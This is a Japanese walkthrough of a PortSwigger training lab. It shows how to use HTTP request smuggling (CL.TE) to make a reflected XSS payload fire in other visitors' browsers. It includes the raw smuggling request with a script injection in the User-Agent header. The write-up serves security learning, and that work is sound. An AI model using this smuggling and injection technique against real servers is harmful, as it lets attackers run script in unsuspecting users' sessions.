# HTTP リクエストの密輸を悪用して反映された XSS を配信する

次のハッキングラボを実施します  
https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss  
このラボにはフロントエンド サーバーとバックエンド サーバーが含まれますが、フロントエンド サーバーはチャンク エンコーディングをサポートしていません。

- 1. BurpSuite を起動して、Proxt タブからブラウザを起動します
- 2. ブラウザからハッキングラボにアクセスします
- 3. 任意にブログにコメントを書き込みます
- 4. コメント一覧を表示します  
     隠された領域に userAgent の値が格納されています

```html
<form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
  <input required type="hidden" name="csrf" value="HszEqA0eL5fcFKbQhqgn6Dq169MyTLk1" />
  <input required type="hidden" name="userAgent" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36" />
  <input required type="hidden" name="postId" value="1" />
  <label>Comment:</label>
  <textarea required rows="12" cols="300" name="comment"></textarea>
  <label>Name:</label>
  <input required type="text" name="name" />
  <label>Email:</label>
  <input required type="email" name="email" />
  <label>Website:</label>
  <input pattern="(http:|https:).+" type="text" name="website" />
  <button class="button" type="submit">Post Comment</button>
</form>
```

- 5. 次のリクエストを送信します

```
POST / HTTP/1.1
Host: 0a1b0004042997c980f0b20a00300098.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=9 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1

```

このリクエストにより、次回コメント一覧を開いた人の環境でスクリプトが実行されます。
